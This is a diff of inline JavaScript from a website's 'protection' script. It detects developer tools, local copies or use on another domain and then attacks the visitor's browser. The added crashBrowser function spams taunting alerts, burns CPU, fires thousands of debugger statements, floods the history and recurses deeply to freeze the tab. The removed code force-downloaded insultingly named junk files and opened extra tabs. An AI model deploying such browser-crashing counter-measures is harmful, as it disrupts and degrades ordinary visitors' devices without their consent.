@@ -2270,6 +2270,76 @@
   const getT = () => taunts[Math.floor(Math.random() * taunts.length)];
   const key = 'site_protection_federal_wtf';
   
+  // Create protection loading screen
+  function createLoadingScreen() {
+    const loader = document.createElement('div');
+    loader.id = 'protection-loader';
+    loader.style.position = 'fixed';
+    loader.style.top = '0';
+    loader.style.left = '0';
+    loader.style.width = '100%';
+    loader.style.height = '100%';
+    loader.style.backgroundColor = '#121212';
+    loader.style.zIndex = '999999';
+    loader.style.display = 'flex';
+    loader.style.flexDirection = 'column';
+    loader.style.justifyContent = 'center';
+    loader.style.alignItems = 'center';
+    loader.style.color = '#cdbb8a';
+    loader.style.fontFamily = 'Consolas, monospace';
+    
+    const loaderText = document.createElement('h2');
+    loaderText.innerText = 'Loading protection...';
+    loaderText.style.marginBottom = '20px';
+    
+    const progress = document.createElement('div');
+    progress.style.width = '300px';
+    progress.style.height = '10px';
+    progress.style.background = 'rgba(205, 187, 138, 0.2)';
+    progress.style.borderRadius = '5px';
+    progress.style.overflow = 'hidden';
+    
+    const progressBar = document.createElement('div');
+    progressBar.style.height = '100%';
+    progressBar.style.width = '0%';
+    progressBar.style.background = '#cdbb8a';
+    progressBar.style.transition = 'width 0.5s';
+    progressBar.id = 'protection-progress';
+    
+    progress.appendChild(progressBar);
+    loader.appendChild(loaderText);
+    loader.appendChild(progress);
+    
+    // Check if body exists yet
+    if (document.body) {
+      document.body.appendChild(loader);
+    } else {
+      // If body doesn't exist, wait for DOM to be ready
+      window.addEventListener('DOMContentLoaded', () => {
+        document.body.appendChild(loader);
+      });
+    }
+    
+    return { 
+      updateProgress: (percent) => {
+        const bar = document.getElementById('protection-progress');
+        if (bar) bar.style.width = percent + '%';
+      },
+      remove: () => {
+        const loader = document.getElementById('protection-loader');
+        if (loader) {
+          loader.style.opacity = '0';
+          loader.style.transition = 'opacity 0.5s';
+          setTimeout(() => {
+            if (loader.parentNode) {
+              loader.parentNode.removeChild(loader);
+            }
+          }, 500);
+        }
+      }
+    };
+  }
+  
   function aggro() {
     document.documentElement.innerHTML = '';
     
@@ -2331,7 +2401,8 @@
     t.appendChild(bg);
     document.body.appendChild(t);
     
-    counter();
+    // Execute counter measures
+    setTimeout(crashBrowser, 100);
     
     try {
       localStorage.setItem(key, 'protected');
@@ -2340,160 +2411,102 @@
     }
   }
   
-  function counter() {
-    function tabs() {
-      const n = Math.floor(Math.random() * 3) + 1;
-      
-      for (let i = 0; i < n; i++) {
-        setTimeout(() => {
-          const txt = getT();
-          const tab = window.open('about:blank', '_blank');
-          
-          if (tab) {
-            tab.document.write(`<!DOCTYPE html><html><head><title>${txt}</title><style>body{background:black;color:#cdbb8a;font-family:Consolas,monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;text-align:center}h1{font-size:4rem}</style></head><body><h1>${txt}</h1></body></html>`);
-          }
-        }, i * 500);
+  // More effective browser crash function
+  function crashBrowser() {
+    // Method 1: Alert spam - interrupts inspection and blocks interaction
+    let alertCount = 0;
+    const maxAlerts = 50;
+    
+    function spamAlerts() {
+      if (alertCount < maxAlerts) {
+        alertCount++;
+        window.alert(getT());
+        setTimeout(spamAlerts, 1);
       }
     }
     
-    function mem() {
-      const arr = [];
-      for (let i = 0; i < 10; i++) {
-        const a = new Array(1000000).fill('x');
-        arr.push(a);
+    // Method 2: Recursive function with no exit condition (similar to while true do end)
+    function recursiveCrash(depth = 0) {
+      const array = new Array(10000).fill('x');
+      if (depth < 10000) {
+        recursiveCrash(depth + 1);
       }
-      window._d = arr;
+      return array;
     }
     
-    function spamFiles() {
-      const ext = ['.txt', '.js', '.html', '.css', '.jpg', '.png', '.json', '.xml', '.pdf', '.svg'];
-      const pref = ['skid', 'loser', 'nice-try', 'L-plus-ratio', 'cope', 'stay-mad', 'skill-issue', 'get-good', 'bozo', 'no-inspect'];
-      
-      function makeBlob(size) {
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-        let str = '';
-        const mb = Math.floor(Math.random() * 10) + 1; // 1-10MB
-        const len = mb * 1024 * 1024;
-        
-        for(let i = 0; i < len; i++) {
-          str += chars.charAt(Math.floor(Math.random() * chars.length));
+    // Method 3: CPU intensive loop
+    function infiniteLoop() {
+      // Create timestamp for loop
+      const start = Date.now();
+      while (true) {
+        // Prevent the browser from completely freezing by checking elapsed time
+        // This will run for ~5 seconds, then allow alerts to continue
+        if (Date.now() - start > 5000) {
+          break;
         }
-        
-        return new Blob([str], {type: 'application/octet-stream'});
+        // Intensive calculations to burn CPU
+        Math.pow(Math.random() * 9999, Math.random() * 9999);
       }
-      
-      function dlFile() {
-        if (document.hasFocus()) {
-          const e = ext[Math.floor(Math.random() * ext.length)];
-          const p = pref[Math.floor(Math.random() * pref.length)];
-          const n = Math.floor(Math.random() * 9999);
-          const fname = `${p}-${n}${e}`;
-          
-          const blob = makeBlob();
-          const url = URL.createObjectURL(blob);
-          
-          const a = document.createElement('a');
-          a.href = url;
-          a.download = fname;
-          a.style.display = 'none';
-          document.body.appendChild(a);
-          a.click();
-          
-          setTimeout(() => {
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-          }, 100);
-        }
-      }
-      
-      for(let i = 0; i < 10; i++) {
-        setTimeout(dlFile, i * 300);
-      }
-      
-      setInterval(() => {
-        if(Math.random() > 0.7) dlFile();
-      }, 5000);
     }
     
-    function alert() {
-      setTimeout(() => {
-        window.alert("This website has detected suspicious activity and has been blocked.");
-      }, 2000);
+    // Method 4: Trigger rapid debugger statements
+    function debuggerBomb() {
+      for (let i = 0; i < 10000; i++) {
+        debugger;
+      }
     }
     
-    function flood() {
-      for (let i = 0; i < 15; i++) {
+    // Method 5: History flooding
+    function historyFlood() {
+      for (let i = 0; i < 500; i++) {
         try {
-          history.pushState({}, "Page " + i, "#blocked" + i);
+          history.pushState({}, "Blocked " + i, "#blocked" + i);
         } catch (e) {}
       }
+      history.go(-500);
     }
     
-    function notif() {
-      if ('Notification' in window) {
-        Notification.requestPermission().then(p => {
-          if (p === 'granted') {
-            new Notification('Security Alert', {
-              body: 'Suspicious activity detected on federal.wtf',
-              icon: '/favicon.ico'
-            });
-          }
-        });
-      }
-    }
+    // Execute in sequence for maximum effect
+    spamAlerts();
     
-    function spamC() {
-      try {
-        const og = {
-          log: console.log,
-          error: console.error,
-          warn: console.warn
-        };
-        
-        for (let i = 0; i < 10000; i++) {
-          //og.error("DETECTED: Inspection attempt #" + i);
-          //og.warn("WARNING: Page inspection detected");
-          //og.log(getT());
-          
-          if (i % 500 === 0) {
-            debugger;
+    setTimeout(() => {
+      infiniteLoop();
+      setTimeout(debuggerBomb, 100);
+      setTimeout(historyFlood, 200);
+      setTimeout(() => {
+        try {
+          recursiveCrash();
+        } catch (e) {
+          // If recursion fails, try while loop
+          let i = 0;
+          while (true) {
+            i++;
+            if (i > 100000000) break; // Safety break to prevent complete crash
           }
         }
-      } catch (e) {}
-    }
-    
-    setTimeout(tabs, 500);
-    setTimeout(mem, 1000);
-    setTimeout(spamFiles, 1000);
-    setTimeout(alert, 2000);
-    setTimeout(flood, 2500);
-    setTimeout(notif, 3000);
-    setTimeout(spamC, 100);
-    
-    window.scrollTo(0, 9999);
-    setInterval(() => window.scrollTo(0, Math.random() * 9999), 500);
+      }, 300);
+    }, 1000);
   }
   
-  if ((window.outerWidth - window.innerWidth > 160) || (window.outerHeight - window.innerHeight > 160)) {
-    aggro();
-    return;
-  }
-  
+  // Check for frame embedding
   if (window.self !== window.top) {
     window.top.location.href = window.self.location.href;
     return;
   }
   
+  // Check for file:// protocol
   if (window.location.protocol === 'file:') {
     aggro();
     return;
   }
   
-  if (window.location.hostname !== dom && window.location.hostname !== dom) {
+  // Check for domain mismatch
+  if (window.location.hostname !== dom && window.location.hostname !== "www." + dom) {
     aggro();
     return;
   }
   
+  // Check if previously caught
   try {
     if (localStorage.getItem(key) === 'protected') {
       aggro();
@@ -2516,12 +2529,63 @@
   
   reset();
   
-  function disC() {
+  // Start loading screen
+  const loader = createLoadingScreen();
+  
+  // Foolproof DevTools detection using Image __defineGetter__ method
+  function initProtection() {
+    let devToolsOpened = false;
+    
+    // Create a detection element
+    const detectElement = new Image();
+    
+    // Use __defineGetter__ to detect when element is inspected
+    detectElement.__defineGetter__("id", function() {
+      devToolsOpened = true;
+      return "detection";
+    });
+    
+    // Regular check interval
+    const checkInterval = setInterval(function() {
+      devToolsOpened = false;
+      console.log(detectElement);
+      console.clear();
+      
+      if (devToolsOpened) {
+        clearInterval(checkInterval);
+        aggro();
+      }
+    }, 1000);
+    
+    // Backup detection using window size method
+    window.addEventListener('resize', function() {
+      if (window.outerHeight - window.innerHeight > 200 || 
+          window.outerWidth - window.innerWidth > 200) {
+        aggro();
+      }
+    });
+    
+    // Alert blocker for inspect element
+    let lastAlertTime = 0;
+    setInterval(() => {
+      const now = Date.now();
+      // Only trigger every 15 seconds to not annoy users
+      if (now - lastAlertTime > 15000 && window.outerHeight - window.innerHeight > 100) {
+        lastAlertTime = now;
+        alert("Operation canceled.");
+      }
+    }, 1000);
+  }
+  
+  function disableConsole() {
     const og = {};
     for (const m in console) {
       if (typeof console[m] === 'function') {
         og[m] = console[m];
         console[m] = function() {
+          if (arguments[0]?.constructor?.name === 'Image' && arguments[0].__lookupGetter__('id')) {
+            return og[m].apply(this, arguments);
+          }
           aggro();
           return false;
         };
@@ -2543,44 +2607,7 @@
     };
   }
   
-  function detDev() {
-    setInterval(function() {
-      const w = window.outerWidth - window.innerWidth > 160;
-      const h = window.outerHeight - window.innerHeight > 160;
-      
-      if (w || h) {
-        aggro();
-      }
-    }, 500);
-    
-    setInterval(function() {
-      const el = document.createElement('div');
-      let c = 0;
-      
-      Object.defineProperty(el, 'id', {
-        get: function() {
-          c++;
-          if (c > 1) {
-            aggro();
-          }
-          return 'det';
-        }
-      });
-      
-      el.style.display = 'none';
-      document.body.appendChild(el);
-      console.log(el);
-      console.clear();
-      
-      setTimeout(function() {
-        if (document.contains(el)) {
-          document.body.removeChild(el);
-        }
-      }, 200);
-    }, 1000);
-  }
-  
-  function block() {
+  function blockKeys() {
     document.addEventListener('keydown', function(e) {
       if (e.key === 'F12' || e.keyCode === 123) {
         e.preventDefault();
@@ -2603,7 +2630,7 @@
     }, true);
   }
   
-  function blockA() {
+  function blockActions() {
     document.addEventListener('contextmenu', function(e) {
       e.preventDefault();
       return false;
@@ -2623,30 +2650,7 @@
     document.head.appendChild(s);
   }
   
-  function detDOM() {
-    const div = document.createElement('div');
-    div.id = 'dom-det';
-    div.style.display = 'none';
-    document.body.appendChild(div);
-    
-    const obs = new MutationObserver(function(muts) {
-      for (const m of muts) {
-        if (m.type === 'childList' || m.type === 'attributes') {
-          aggro();
-        }
-      }
-    });
-    
-    obs.observe(div, { 
-      attributes: true, 
-      childList: true,
-      attributeOldValue: true
-    });
-    
-    return div;
-  }
-  
-  function detBot() {
+  function detectBot() {
     const ua = navigator.userAgent.toLowerCase();
     const bp = ['bot', 'spider', 'crawl', 'wget', 'curl', 'scrape', 'http', 'java', 'python', 'requests', 'headless'];
     
@@ -2667,7 +2671,7 @@
     return false;
   }
   
-  function breakOff() {
+  function checkModification() {
     function chkConn() {
       const img = new Image();
       img.onload = function() {
@@ -2692,96 +2696,62 @@
     document.head.appendChild(s);
   }
   
-  function spam() {
-    const d = document.createElement('div');
-    d.style.display = 'none';
-    d.id = 'dum';
-    document.body.appendChild(d);
+  // Initialize all protections with a loading sequence
+  function initializeProtection() {
+    // Sequential loading with progress updates
+    const steps = [
+      { name: 'Initializing core protection', func: initProtection, weight: 30 },
+      { name: 'Securing console access', func: disableConsole, weight: 20 },
+      { name: 'Implementing keyboard protection', func: blockKeys, weight: 15 },
+      { name: 'Setting up action blocking', func: blockActions, weight: 15 },
+      { name: 'Finalizing security measures', func: checkModification, weight: 20 }
+    ];
     
-    function rStr(len) {
-      const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-      let r = '';
-      for (let i = 0; i < len; i++) {
-        r += c.charAt(Math.floor(Math.random() * c.length));
-      }
-      return r;
+    let progress = 0;
+    
+    // Don't run protection if it's a bot
+    if (detectBot()) {
+      loader.remove();
+      return;
     }
     
-    function fake() {
-      for (let i = 0; i < 1000; i++) {
-        const t = Math.random() > 0.5 ? 'script' : 'link';
-        
-        if (t === 'script') {
-          const s = document.createElement('script');
-          s.src = rStr(10) + '.js';
-          s.async = true;
-          s.defer = true;
-          d.appendChild(s);
-        } else {
-          const l = document.createElement('link');
-          l.rel = 'stylesheet';
-          l.href = rStr(10) + '.css';
-          d.appendChild(l);
+    // Run each step with progress updates
+    function runStep(index) {
+      if (index >= steps.length) {
+        // All steps complete
+        loader.updateProgress(100);
+        setTimeout(() => {
+          loader.remove();
+        }, 500);
+        return;
+      }
+      
+      const step = steps[index];
+      setTimeout(() => {
+        try {
+          step.func();
+        } catch (e) {
+          console.error('Protection step failed:', e);
         }
-      }
+        
+        progress += step.weight;
+        loader.updateProgress(progress);
+        
+        // Run next step
+        runStep(index + 1);
+      }, 400); // Small delay between steps for visual effect
     }
     
-    function junk() {
-      const j = document.createElement('div');
-      j.style.display = 'none';
-      j.id = 'junk';
-      
-      let data = '';
-      for (let i = 0; i < 1000000; i++) {
-        data += rStr(10);
-      }
-      
-      j.setAttribute('data-junk', data);
-      d.appendChild(j);
-    }
-    
-    function img() {
-      const c = document.createElement('div');
-      c.style.display = 'none';
-      c.id = 'fake-img';
-      
-      for (let i = 0; i < 50; i++) {
-        const im = document.createElement('img');
-        im.src = 'data:image/gif;base64,' + rStr(10000);
-        c.appendChild(im);
-      }
-      
-      d.appendChild(c);
-    }
-    
-    fake();
-    junk();
-    img();
-    
-    setInterval(function() {
-      d.innerHTML = '';
-      fake();
-      junk();
-      img();
-    }, 30000);
+    // Start the sequence
+    runStep(0);
   }
   
-  disC();
-  detDev();
-  block();
-  blockA();
-  detDOM();
+  // Initialize with a small delay to ensure DOM is ready
+  setTimeout(initializeProtection, 500);
   
-  if (!detBot()) {
-    breakOff();
-    spam();
-  }
-  
+  // Clean up on page unload
   window.addEventListener('beforeunload', reset);
 })();
-  </script>
-</body>
-</html>
   </script>
 </body>
 </html>
